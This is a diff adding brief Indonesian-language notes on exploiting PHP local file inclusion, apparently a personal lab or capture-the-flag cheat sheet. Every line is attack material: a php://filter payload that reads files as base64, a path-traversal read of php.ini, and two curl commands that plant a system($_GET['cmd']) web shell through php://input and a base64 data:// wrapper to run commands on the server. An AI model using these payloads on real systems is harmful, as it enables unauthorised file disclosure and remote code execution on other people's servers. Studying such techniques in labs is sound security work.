@@ -1,0 +1,10 @@
+ngecek data tapi di encrypt pake base64
+php://filter/read=convert.base64-encode/resource=<file>
+
+checking allow_url_include disini dulu (kalo pake nginx tinggal ganti aja apache nya)
+php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+
+RCE bisa 2 command
+1. curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" yang ini harus bisa nerima request POST
+
+2. curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
